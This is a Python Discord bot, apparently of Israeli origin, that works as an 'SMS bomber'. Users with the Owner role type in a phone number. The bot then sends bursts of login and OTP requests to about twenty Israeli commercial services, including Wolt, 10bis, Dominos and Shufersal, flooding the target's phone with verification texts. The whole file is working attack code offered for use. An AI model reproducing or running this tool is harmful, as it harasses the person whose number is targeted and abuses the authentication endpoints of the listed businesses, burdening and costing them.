import discord
from discord.ext import commands
import os
import httpx
import asyncio

# הגדרות
OWNER_ROLE_NAME = "Owner"
# שים לב: ב-Render עדיף להשתמש ב-Environment Variables, אבל לבקשתך שמתי אותו כאן ישירות
TOKEN = os.getenv("DISCORD_TOKEN")

class SpamView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.primary, emoji="🚀", custom_id="spam_btn")
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        role = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)
        if not role:
            return await interaction.response.send_message("❌ רק Owner יכול להפעיל את הספאמר!", ephemeral=True)
        await interaction.response.send_modal(SpamModal())

class SpamModal(discord.ui.Modal, title="SMS Bomber"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)

    async def on_submit(self, interaction: discord.Interaction):
        phone_val = self.phone.value
        await interaction.response.send_message(f"💣 מתחיל הפצצה על {phone_val}...", ephemeral=True)
        
        endpoints = [
            {"name": "Wolt", "url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{phone_val[1:]}"}},
            {"name": "10bis", "url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone_val, "isSmsAuth": True}},
            {"name": "Pango", "url": "https://pango.co.il/api/auth/login", "json": {"phone": phone_val}},
            {"name": "Yellow", "url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone_val}},
            {"name": "Gett", "url": "https://gett-israel.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
            {"name": "PizzaHut", "url": "https://pizzahut.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"name": "Dominos", "url": "https://www.dominos.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"name": "Rebar", "url": "https://rebar.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
            {"name": "SuperPharm", "url": "https://shoppers-api.super-pharm.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"name": "KSP", "url": "https://ksp.co.il/api/v1/auth/send-otp", "json": {"phone": phone_val}},
            {"name": "Ivory", "url": "https://www.ivory.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
            {"name": "Azrieli", "url": "https://www.azrieli.com/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/auth/login", "json": {"phone": phone_val}},
            {"name": "Shufersal", "url": "https://www.shufersal.co.il/online/he/login/otp", "json": {"phone": phone_val}},
            {"name": "Be", "url": "https://www.be-pharm.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"name": "Castro", "url": "https://www.castro.com/api/v1/auth/login", "json": {"phone": phone_val}},
            {"name": "Renuar", "url": "https://www.renuar.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"name": "TerminalX", "url": "https://www.terminalx.com/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"name": "Fox", "url": "https://www.fox.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
            {"name": "Golda", "url": "https://www.goldababa.co.il/api/v1/auth/otp", "json": {"phone": phone_val}}
        ]

        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}

        async with httpx.AsyncClient(headers=headers, timeout=5.0) as client:
            for _ in range(2):
                tasks = [client.post(api["url"], json=api.get("json")) for api in endpoints]
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(5)

        await interaction.followup.send(f"✅ ההפצצה על {phone_val} הסתיימה!", ephemeral=True)

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        self.add_view(SpamView())

bot = MyBot()

@bot.command()
@commands.has_role(OWNER_ROLE_NAME)
async def setup(ctx):
    embed = discord.Embed(
        title="Spam sms bomber | By Nehoray yosef Lidor belazada",
        description="**💣 Spam Phone**\nFull Database Active\n\n**👑 Admin Only**\nUse carefully",
        color=discord.Color.dark_grey()
    )
    await ctx.send(embed=embed, view=SpamView())

# הפעלת הבוט
bot.run(TOKEN)
